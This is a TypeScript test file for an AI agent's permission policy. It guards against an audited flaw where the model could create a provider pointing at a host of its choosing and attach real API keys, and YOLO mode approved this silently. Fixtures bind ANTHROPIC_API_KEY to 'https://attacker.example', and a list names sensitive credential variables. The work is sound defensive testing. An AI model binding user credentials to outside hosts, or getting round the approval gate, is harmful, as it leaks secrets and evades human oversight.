import * as fs from 'node:fs/promises';
import * as os from 'node:os';
import * as path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import type { Context } from '../../src/core/context.js';
import { DefaultPermissionPolicy } from '../../src/security/permission-policy.js';
import { attachesWellKnownCredential } from '../../src/security/yolo-risk.js';
import type { Tool } from '../../src/types/index.js';

/**
 * Regression for the `provider_manage` exfiltration primitive found by the
 * 2026-08-20 security-check audit.
 *
 * The tool lets a caller create a provider, pick its `baseUrl` (validated for
 * scheme only — no host allowlist) and name the environment variables its key is
 * read from. `rejectBorrowedEnvVars` only rejects names another provider already
 * claims, and nothing claims `ANTHROPIC_API_KEY` on a stock install — so the
 * model could bind a real credential to a host it chose. `yoloBlockedAsDestructive`
 * only inspected shell surfaces, so under YOLO this auto-approved silently.
 */

function tool(name: string): Tool {
  return {
    name,
    description: name,
    inputSchema: { type: 'object' },
    permission: 'auto',
    mutating: true,
    subjectKey: 'baseUrl',
    async execute() {
      return 'ok';
    },
  } as Tool;
}

const ctx = (): Context => ({ hasRead: () => false, projectRoot: '/proj' }) as never as Context;

let dir: string;
let trustFile: string;
beforeEach(async () => {
  dir = await fs.mkdtemp(path.join(os.tmpdir(), 'yolo-cred-'));
  trustFile = path.join(dir, 'trust.json');
});
afterEach(async () => {
  await fs.rm(dir, { recursive: true, force: true });
});

describe('attachesWellKnownCredential', () => {
  it.each([
    ['ANTHROPIC_API_KEY'],
    ['OPENAI_API_KEY'],
    ['AWS_SECRET_ACCESS_KEY'],
    ['GITHUB_TOKEN'],
    ['GOOGLE_GENERATIVE_AI_API_KEY'],
    ['WRONGSTACK_VAULT_PASSPHRASE'],
  ])('flags %s', (name) => {
    expect(attachesWellKnownCredential({ envVars: [name] })).toBe(true);
  });

  it('is case-insensitive on the env var name', () => {
    expect(attachesWellKnownCredential({ envVars: ['anthropic_api_key'] })).toBe(true);
  });

  it('leaves a provider naming its OWN key alone', () => {
    // This is the tool's legitimate purpose and must keep working.
    expect(attachesWellKnownCredential({ envVars: ['MYLLM_API_KEY'] })).toBe(false);
    expect(attachesWellKnownCredential({ envVars: ['ACME_TOKEN'] })).toBe(false);
  });

  it('ignores inputs with no envVars', () => {
    expect(attachesWellKnownCredential({ baseUrl: 'https://example.com' })).toBe(false);
    expect(attachesWellKnownCredential(undefined)).toBe(false);
    expect(attachesWellKnownCredential('nonsense')).toBe(false);
  });
});

describe('attachesWellKnownCredential — deep carrier scan (VULN-006 item 3)', () => {
  // Report item 3: the predicate read ONLY the top-level `envVars` key, so
  // credential carriers nested inside config-sync / mass-assignment payloads
  // (or named `env` / `env_vars`, or given as a single string) were invisible
  // to the YOLO gate. Red-first: written against the shallow implementation.
  it('sees envVars nested inside a payload object', () => {
    expect(attachesWellKnownCredential({ config: { envVars: ['OPENAI_API_KEY'] } })).toBe(true);
  });

  it('treats env-object KEYS as names (MCP-server env map)', () => {
    expect(
      attachesWellKnownCredential({
        mcpServer: { command: 'run.sh', env: { ANTHROPIC_API_KEY: 'sk' } },
      }),
    ).toBe(true);
  });

  it('reads the catalog-style env array', () => {
    expect(attachesWellKnownCredential({ catalogEntry: { env: ['OPENAI_API_KEY'] } })).toBe(true);
  });

  it('accepts a single-name string form', () => {
    expect(attachesWellKnownCredential({ envVars: 'OPENAI_API_KEY' })).toBe(true);
  });

  it('matches snake_case carrier keys', () => {
    expect(attachesWellKnownCredential({ env_vars: ['OPENAI_API_KEY'] })).toBe(true);
  });

  it('ignores nested names that are not well-known credentials', () => {
    expect(attachesWellKnownCredential({ config: { envVars: ['LOCAL_LLM_KEY'] } })).toBe(false);
  });

  it('fails closed past the documented depth bound', () => {
    // Exhaustion = "cannot prove clean" = risky. A carrier hidden below the
    // scan depth must still force human approval, not silently pass.
    let deep: Record<string, unknown> = { envVars: ['OPENAI_API_KEY'] };
    for (let i = 0; i < 8; i++) deep = { wrapper: deep };
    expect(attachesWellKnownCredential(deep)).toBe(true);
  });

  it('fails closed when the node budget is exhausted before the carrier', () => {
    // ~600 container nodes ahead of the carrier exhaust the node budget;
    // exhaustion must read as risky, never as "no carrier found".
    const padded: Record<string, unknown> = {};
    for (let i = 0; i < 600; i++) padded[`pad${i}`] = { n: i };
    padded.wrapper = { envVars: ['OPENAI_API_KEY'] };
    expect(attachesWellKnownCredential(padded)).toBe(true);
  });

  it('still ignores inputs with no credential carriers', () => {
    expect(attachesWellKnownCredential({ provider: 'myllm', baseUrl: 'https://x' })).toBe(false);
  });
});

describe('YOLO does not silently bind a real credential to a chosen host', () => {
  it('refuses to auto-approve under YOLO', async () => {
    const p = new DefaultPermissionPolicy({ trustFile, yolo: true });
    const decision = await p.evaluate(
      tool('provider_manage'),
      {
        action: 'add',
        provider: 'evil',
        baseUrl: 'https://attacker.example',
        envVars: ['ANTHROPIC_API_KEY'],
      },
      ctx(),
    );

    expect(decision.permission).not.toBe('auto');
  });

  it('still auto-approves an ordinary provider edit under YOLO', async () => {
    const p = new DefaultPermissionPolicy({ trustFile, yolo: true });
    const decision = await p.evaluate(
      tool('provider_manage'),
      {
        action: 'configure',
        provider: 'myllm',
        baseUrl: 'https://api.myllm.test',
        envVars: ['MYLLM_API_KEY'],
      },
      ctx(),
    );

    expect(decision.permission).toBe('auto');
  });

  it('yoloDestructive still opts back in, as for every other destructive path', async () => {
    const p = new DefaultPermissionPolicy({ trustFile, yolo: true, yoloDestructive: true });
    const decision = await p.evaluate(
      tool('provider_manage'),
      {
        action: 'add',
        provider: 'evil',
        baseUrl: 'https://attacker.example',
        envVars: ['ANTHROPIC_API_KEY'],
      },
      ctx(),
    );

    expect(decision.permission).toBe('auto');
  });

  it('does not auto-approve when the credential carrier is nested, not top-level', async () => {
    // VULN-006 item 3: config-sync and mass-assignment payloads can carry the
    // envVars array one or more levels below the input root; the YOLO gate
    // must see it there too.
    const p = new DefaultPermissionPolicy({ trustFile, yolo: true });
    const decision = await p.evaluate(
      tool('provider_manage'),
      {
        action: 'add',
        provider: 'evil',
        baseUrl: 'https://attacker.example',
        config: { envVars: ['ANTHROPIC_API_KEY'] },
      },
      ctx(),
    );

    expect(decision.permission).not.toBe('auto');
  });
});
